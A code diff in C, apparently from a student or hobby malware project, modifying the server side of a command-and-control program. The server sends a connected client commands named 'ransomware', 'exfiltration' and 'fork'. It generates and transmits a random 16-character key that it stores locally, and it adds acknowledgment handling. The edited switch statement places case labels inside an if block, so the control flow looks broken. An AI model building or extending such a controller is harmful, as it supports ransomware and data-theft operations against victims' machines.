@@ -100,49 +100,73 @@ int main()
             {
             case 1:
                 command = "ransomware";
-                send(client_fd, command, strlen(command), 0);
-                char *random_string = gener(16);
-                send(client_fd, random_string, strlen(random_string), 0);
-                stock (random_string,buffer);
-                break;
-            case 2:
-                command = "exfiltration";
-                break;
-            case 3:
-                command = "fork";
-                break;
-            case 4:
-                command = "quit";
-                break;
-            case 5:
-                command = "quit";
-                break;
-            default:
-                printf("Invalid choice. Please select a valid option.\n");
-                continue;
+
+                if (send(client_fd, command, strlen(command), 0) == -1)
+                {
+                    perror("send");
+                    break;
+                }
+                printf("Command sent: %s\n", command);
+                char ack[BUFSIZ];
+                int bytes_read = recv(client_fd, ack, sizeof(ack) - 1, 0);
+                if (bytes_read <= 0)
+                {
+                    if (bytes_read == 0)
+                        printf("Client disconnected while waiting for acknowledgment.\n");
+                    else
+                        perror("recv");
+                    break;
+                }
+                ack[bytes_read] = '\0'; // Terminer la chaîne reçue
+
+                // Vérifier si l'accusé de réception correspond à "Command received"
+                if (strcmp(ack, "Command received") == 0)
+                {
+                    printf("Acknowledgment received: %s\n", ack);
+
+                    char *random_string = gener(16);
+                    send(client_fd, random_string, strlen(random_string), 0);
+                    stock(random_string, buffer);
+                    break;
+                case 2:
+                    command = "exfiltration";
+                    break;
+                case 3:
+                    command = "fork";
+                    break;
+                case 4:
+                    command = "out";
+                    break;
+                case 5:
+                    command = "quit";
+                    break;
+                default:
+                    printf("Invalid choice. Please select a valid option.\n");
+                    continue;
+                }
+
+                // Envoyer la commande au client
+                if (send(client_fd, command, strlen(command), 0) == -1)
+                {
+                    perror("send");
+                    break;
+                }
+
+                printf("Command sent: %s\n", command);
+
+                // Si la commande est "quit", on déconnecte le client
+                if (strcmp(command, "quit") == 0)
+                {
+                    printf("Disconnecting client...\n");
+                    break;
+                }
             }
 
-            // Envoyer la commande au client
-            if (send(client_fd, command, strlen(command), 0) == -1)
-            {
-                perror("send");
-                break;
-            }
-
-            printf("Command sent: %s\n", command);
-
-            // Si la commande est "quit", on déconnecte le client
-            if (strcmp(command, "quit") == 0)
-            {
-                printf("Disconnecting client...\n");
-                break;
-            }
+            close(client_fd);
+            printf("Client connection closed.\n");
         }
 
-        close(client_fd);
-        printf("Client connection closed.\n");
+        close(socket_fd);
+        return 0;
     }
-
-    close(socket_fd);
-    return 0;
 }
